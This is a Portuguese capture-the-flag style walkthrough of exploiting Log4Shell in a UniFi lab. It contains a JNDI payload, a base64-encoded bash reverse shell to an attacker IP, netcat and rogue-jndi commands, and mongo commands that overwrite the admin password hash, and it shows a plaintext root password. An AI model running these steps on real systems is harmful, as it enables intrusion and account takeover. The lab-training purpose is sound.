2025-08-03 08:35

Status: #developed   #segurança 

Tags: [[CyberSecurity]] | [[Nagios]] | [[Nmap]] | [[Maven]]

----
# Introdução

Este artigo explora os efeitos da exploração do Log4J em um sistema de monitoramento de dispositivos de rede muito conhecido chamado “UniFi”.

Este laboratório mostrará como configurar e instalar os pacotes e ferramentas necessários para explorar o UniFi abusando da vulnerabilidade do Log4J e manipular um cabeçalho POST chamado `remember`, dando a você um shell reverso na máquina. Você também alterará a senha do administrador, modificando o hash salvo na instância do MongoDB que está em execução no sistema, o que permitirá o acesso ao painel de administração e levará à divulgação da senha SSH do administrador.

---
# Enumeração

O primeiro passo é verificar o endereço IP alvo com o Nmap para verificar quais portas estão abertas. Faremos isso com ajuda do `nmap`.

- `-sC`: Executa uma varredura de script usando o conjunto padrão de scripts. É equivalente a `--script=default`. 
- `-sV`: Detecção de versão
- `-v`: Aumenta o nível de verbosidade, fazendo com que o Nmap imprima mais informações sobre a varredura em andamento.

![[Pasted image 20250803083924.png]]

A varredura revela que a porta `8080` está aberta, executando um proxy HTTP. O proxy parece redirecionar solicitações para a porta 8443, que parece estar executando um servidor web SSL. Observamos que o título HTTP da página na porta `8443` é `Unifi Network`.

![[Pasted image 20250803084043.png]]

Ao acessar a página usando um navegador, somos apresentados à página de login do portal web `UniFi` e o número da versão é `6.4.54`. Se encontrarmos um número de versão, é sempre uma ótima ideia pesquisar essa versão específica no Google. Uma rápida busca no Google usando as palavras-chave `UniFi 6.4.54 exploit` revela um [artigo](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) que discute a exploração aprofundada da vulnerabilidade [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) neste aplicativo.

---
# LOG4J

Esta vulnerabilidade do Log4J pode ser explorada pela injeção de comandos do sistema operacional (OS Command Injection), que é uma vulnerabilidade de segurança web que permite que um invasor execute comandos arbitrários do sistema operacional no servidor que está executando o aplicativo e, normalmente, comprometa completamente o aplicativo e todos os seus dados.

Para determinar se este é o caso, podemos usar o `FoxyProxy` após fazer uma solicitação POST ao endpoint `/api/login`para repassar a solicitação ao BurpSuite, que a interceptará como um intermediário. A solicitação pode então ser editada para injetar comandos. Fornecemos um ótimo módulo baseado na interceptação de solicitações web.

---
# Interceptando Solicitações Web

Primeiro, tentamos acessar a página com as credenciais `test:test`, pois não estamos tentando validar ou obter acesso. A solicitação de login será capturada pelo BurpSuite e poderemos modificá-la.

Antes de modificar a solicitação, vamos enviar este pacote HTTPS para o módulo `Repeater` do BurpSuite pressionando `CTRL+R`.

---
# Exploração

A seção Exploração do [artigo](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) mencionado anteriormente menciona que precisamos inserir nossa carga útil no parâmetro `remember`. Como os dados POST estão sendo enviados como um objeto JSON e como a carga útil contém colchetes `{}`, para evitar que ela seja analisada como outro objeto JSON, nós a colocamos entre colchetes `"` para que seja analisada como uma string.

![[Pasted image 20250803090340.png]]

Inserimos a carga útil no campo `remember`, conforme mostrado acima, para que possamos identificar um ponto de injeção, se houver. Se a solicitação fizer com que o servidor se conecte novamente a nós, verificamos que o aplicativo está vulnerável.

```http
${jndi:ldap://{Tun0 IP Address}/whatever}
```

>[!note] Nota
>Em `{Tun0 IP Address}` você deve utilizar o **seu próprio endereço IP** da interface `tun0`. Para descobrir esse endereço, execute o comando `ip a` no terminal e procure pela interface `tun0`. O IP estará indicado após o campo `inet`.

- **JNDI** é a sigla para *Java Naming and Directory Interface API* (API de Interface de Nomeação e Diretório Java). Ao fazer chamadas para essa API, os aplicativos localizam recursos e outros objetos de programa. Um recurso é um objeto de programa que fornece conexões a sistemas, como servidores de banco de dados e sistemas de mensagens.

- LDAP é a sigla para *Lightweight Directory Access Protocol* (Protocolo de Acesso a Diretórios Leve), que é um protocolo de aplicação aberto, independente de fornecedor, padrão da indústria para acessar e manter serviços de informações de diretório distribuídos pela Internet ou uma rede. A porta padrão em que o LDAP é executado é a porta `389`.

![[Pasted image 20250803090701.png]]

Depois que clicarmos em `send`, o painel de `Response` exibirá a resposta da requisição. A saída nos mostra uma **mensagem de erro** informando que o payload é inválido, mas **apesar da mensagem de erro, o payload está realmente sendo executado**.

Vamos prosseguir iniciando o `tcpdump` na porta `389`, que irá monitorar o tráfego de rede em busca de conexões **LDAP**.

>[!note] Nota
>O `tcpdump` é um programa analisador de pacotes de rede que funciona por meio da **linha de comando**. Ele permite que o usuário visualize pacotes **TCP/IP** e outros tipos de pacotes que estão sendo transmitidos ou recebidos por uma rede à qual o computador está conectado.

Abra outro terminal e digite:

```bash
sudo tcpdump -i tun0 port 389
```

_A sintaxe acima pode ser dividida e explicada da seguinte forma._

- `sudo`: Execute este comando como **root**, também conhecido como administrador.
- `tcpdump`: É o programa ou software similar ao **Wireshark**, porém em versão de **linha de comando**.
- `-i`: Seleciona a interface de rede. (Exemplo: eth0, wlan, tun0)
- `port 389`: Especifica a porta que estamos monitorando.

Após iniciar o `tcpdump`, clique no botão `Send`.

![[Pasted image 20250803093120.png]]

A saída do `tcpdump` mostra que uma conexão foi recebida em nossa máquina. Isso **prova que a aplicação é de fato vulnerável**, já que está tentando se conectar de volta a nós pela porta **LDAP 389**.

![[Pasted image 20250803093335.png]]

---
# Criando Payload

Precisaremos instalar o `Open-JDK` e o `Maven` em nosso sistema para construir um **payload** que será enviado ao servidor e nos permitirá obter **execução remota de código** no sistema vulnerável.

![[Pasted image 20250803093406.png]]

O **Open-JDK** é o kit de desenvolvimento Java, usado para criar aplicações em Java. Já o **Maven** é um **ambiente de desenvolvimento integrado (IDE)** que pode ser usado para criar um projeto estruturado e compilar nossos projetos em arquivos `.jar`.

Essas ferramentas também nos ajudarão a executar o aplicativo Java **rogue-jndi**, que inicia um servidor LDAP local e permite **receber conexões do servidor vulnerável e executar código malicioso**.

Depois de instalar o **Open-JDK**, podemos prosseguir com a instalação do **Maven**. Mas antes, vamos trocar para o usuário **root**.

```bash
sudo apt-get install maven
```

Após a conclusão da instalação, podemos verificar a versão do Maven da seguinte forma.

![[Pasted image 20250803093507.png]]

Com os pacotes necessários instalados, agora precisamos **baixar e compilar a aplicação Java Rogue-JNDI**.

Vamos clonar o repositório correspondente e **compilar o pacote usando o Maven**.

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

![[Pasted image 20250803093544.png]]

Isso criará um arquivo `.jar` no diretório `rogue-jndi/target/` chamado **RogueJndi-1.1.jar**. Agora podemos **construir nosso payload** para ser passado à aplicação Java **RogueJndi-1.1.jar**.

Para utilizar o servidor **Rogue-JNDI**, precisaremos criar e passar um **payload**, que será responsável por nos fornecer uma **shell** no sistema afetado. Faremos a **codificação em Base64** do payload para evitar problemas de codificação.

```bash
echo 'bash -c bash -i >&/dev/tcp/{Seu Endereço IP}/{Uma porta de sua escolha} 0>&1' | base64
```

>[!note] Observação:
>Após o payload ter sido criado, inicie a aplicação **Rogue-JNDI** passando o payload com a opção `--command` e o endereço IP da sua interface `tun0` com a opção `--hostname`.

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}| {base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
```

- **Exemplo:**

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,- d}|{bash,-i}" --hostname "10.10.14.33"
```

![[Pasted image 20250803093804.png]]

Agora que o servidor está escutando localmente na porta `389`, vamos abrir outro terminal e iniciar um ouvinte `netcat` para capturar o shell reverso.

```bash
nc -lvp 4444
```


Voltando à nossa requisição POST interceptada, vamos alterar o payload para `${jndi:ldap://{Seu IP do Tun0}:1389/o=tomcat}` e clicar em Enviar.

![[Pasted image 20250804204634.png]]

Após o envio da solicitação, uma conexão com nosso servidor Rogue é recebida e a seguinte mensagem é exibida.

```text
Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
```

Assim que recebermos a saída do servidor Rogue, um shell será gerado em nosso ouvinte `netcat` e poderemos atualizar o shell do terminal usando o seguinte comando.

```bash
script /dev/null -c bash
```

![[Pasted image 20250804204816.png]]

O comando acima transformará nosso shell em um shell interativo que nos permitirá interagir com o sistema de forma mais eficaz.

A partir daqui, podemos navegar até `/home/Michael/` e ler o sinalizador do usuário.

![[Pasted image 20250804204826.png]]

---
# Escalada de Privilégio

O artigo afirma que podemos acessar o painel de administração do aplicativo UniFi e possivelmente extrair os segredos SSH usados entre os dispositivos. Primeiro, vamos verificar se o MongoDB está em execução no sistema de destino, o que pode nos permitir extrair credenciais para acessar o painel de administração.

```bash
ps aux | grep mongo
```

![[Pasted image 20250804205240.png]]

Podemos ver que o MongoDB está em execução no sistema de destino na porta 27117.

>[!note] Observação:
>O MongoDB é um programa de banco de dados multiplataforma, orientado a documentos e disponível em código fonte.
>
>Classificado como um programa de banco de dados NoSQL, o MongoDB utiliza documentos do tipo JSON com esquemas opcionais.


Vamos interagir com o serviço MongoDB usando o utilitário de linha de comando `mongo` e tentando extrair a senha do administrador. Uma rápida pesquisa no Google usando as palavras-chave `UniFi Default Database` mostra que o nome do banco de dados padrão para o aplicativo UniFi é `ace`.

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
```

![[Pasted image 20250804205253.png]]

![[Pasted image 20250805193017.png]]

A saída revela um usuário chamado Administrador. O hash da senha dele está localizado na variável `x_shadow`, mas neste caso, ele não pode ser quebrado com nenhum utilitário de quebra de senha. Em vez disso, podemos alterar o hash da senha `x_shadow` pelo nosso próprio hash criado para substituir a senha do administrador e autenticar no painel administrativo. Para isso, podemos usar o utilitário de linha de comando `mkpasswd`.

```bash
mkpasswd -m sha-512 Password1234

$6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XX M8P5Z8j4NB1gJGTONl1
```

O `$6$` é o identificador do algoritmo de hash que está sendo usado, que é SHA-512 neste caso, portanto, teremos que criar um hash do mesmo tipo.

>[!note] Observação:
>SHA-512, ou Algoritmo de Hash Seguro 512, é um algoritmo de hash usado para converter texto de qualquer comprimento em uma string de tamanho fixo.
>
>Cada saída produz um comprimento SHA-512 de 512 bits (64 bytes). Este algoritmo é comumente usado para hash de endereços de e-mail, hash de senhas...

Depois de gerarmos o hash SHA-512, a saída será semelhante à acima; no entanto, devido ao salt, o hash mudará sempre que for gerado.

>[!note] Observação:
>Um sal é adicionado ao processo de hash para forçar sua unicidade, aumentar sua complexidade sem aumentar os requisitos do usuário e para mitigar ataques de senha, como tabelas de hash.

Agora vamos substituir o hash existente com o que foi criado.

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
```

![[Pasted image 20250805203519.png]]

Podemos verificar se a senha foi atualizada no banco de dados Mongo executando o mesmo comando acima. O hash SHA-512 parece ter sido atualizado.

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

Agora, vamos visitar o site e fazer login como `administrator`. É muito importante observar que o nome de usuário diferencia maiúsculas de minúsculas.

![[Pasted image 20250805203535.png]]

O processo de autenticação foi bem-sucedido e agora temos acesso administrativo ao aplicativo UniFi.

![[Pasted image 20250805203700.png]]

O UniFi oferece uma configuração para Autenticação SSH, que é uma funcionalidade que permite administrar outros Pontos de Acesso via SSH a partir de um console ou terminal.

Navegue até `settings -> site` e role para baixo para encontrar a configuração de Autenticação SSH. A autenticação SSH com senha de root foi habilitada.

A página mostra que a senha do root em texto simples é NotACrackablePassword4U2022. Vamos tentar autenticar no sistema como root via SSH.

```bash
ssh root@10.129.96.149
```

![[Pasted image 20250805203905.png]]

A conexão foi bem-sucedida e o sinalizador root pode ser encontrado em /root.